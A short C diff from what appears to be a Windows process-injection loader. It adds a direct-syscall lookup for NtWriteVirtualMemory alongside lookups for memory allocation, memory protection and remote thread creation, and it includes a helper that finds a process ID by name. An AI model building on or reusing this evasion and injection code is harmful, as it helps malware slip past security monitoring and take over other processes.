@@ -41,6 +41,7 @@ extern DWORD g_ssn_NtAllocateVirtualMemory;
 extern DWORD g_ssn_NtProtectVirtualMemory;
 extern DWORD g_ssn_NtCreateThreadEx;
 extern DWORD g_ssn_NtWaitForSingleObject;
+extern DWORD g_ssn_NtWriteVirtualMemory;
 
 DWORD GetProcessIdByName(LPCUWSTR procname) {
     DWORD pid = 0;
@@ -216,6 +217,7 @@ BOOL InitializeSyscalls() {
     if (!FindSyscall("NtProtectVirtualMemory", g_ssn_NtProtectVirtualMemory, g_syscall_addr)) return FALSE;
     if (!FindSyscall("NtCreateThreadEx", g_ssn_NtCreateThreadEx, g_syscall_addr)) return FALSE;
     if (!FindSyscall("NtWaitForSingleObject", g_ssn_NtWaitForSingleObject, g_syscall_addr)) return FALSE;
+    if (!FindSyscall("NtWriteVirtualMemory", g_ssn_NtWriteVirtualMemory, g_syscall_addr)) return FALSE;
 
     // Find Syscall for other APIs
 
